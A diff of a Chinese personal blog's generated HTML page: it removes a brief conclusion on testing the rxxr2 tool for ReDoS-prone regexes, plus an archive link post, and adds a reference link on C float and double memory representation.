-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次测试过程中，存在一些问题：</p>
-<ul>
-<li>常用库收集得并不多</li>
-<li>rxxr2工具也有误报和漏报的情况<ul>
-<li>Python正则中会有<code>?P&lt;major&gt;</code>命名组的写法，因为rxxr2不能处理这种特殊情况，所以可能会产生漏报；</li>
-<li>部分正则使用非贪婪匹配时，似乎无法产生ReDos效果，会产生误报</li>
-</ul>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-old_link/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-old_link/" class="post-title-link" itemprop="url">历史文章存档</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>2017-2019年的历史文章，共8篇</p>
-<p><a target="_blank" rel="noopener" href="https://leveryd.github.io/">https://leveryd.github.io/</a></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="http://c.biancheng.net/cpp/html/3095.html">C语言float、double的内存表示</a></p>
 
       
     </div>
